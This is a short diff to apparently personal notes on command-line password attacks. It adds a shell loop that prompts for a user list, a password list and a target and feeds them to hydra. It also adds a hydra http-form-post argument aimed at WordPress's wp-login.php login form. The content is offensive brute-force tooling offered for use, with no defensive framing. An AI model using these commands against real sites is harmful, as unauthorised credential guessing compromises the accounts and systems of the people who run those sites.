@@ -1,7 +1,15 @@
 # Command Line human readable password attacks for fast on the fly procressing 
 
-
+while true; do
+echo "userlist: " "passlist: " "target: "
+read users passlist target
 hydra -l $users -P $passlist $target <service module> <post request parameters>[/code]
+done
+
+#wordpress
+-V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
+
+
 
 Finally, based on information we have gathered, our commands ahould look something like this:
 
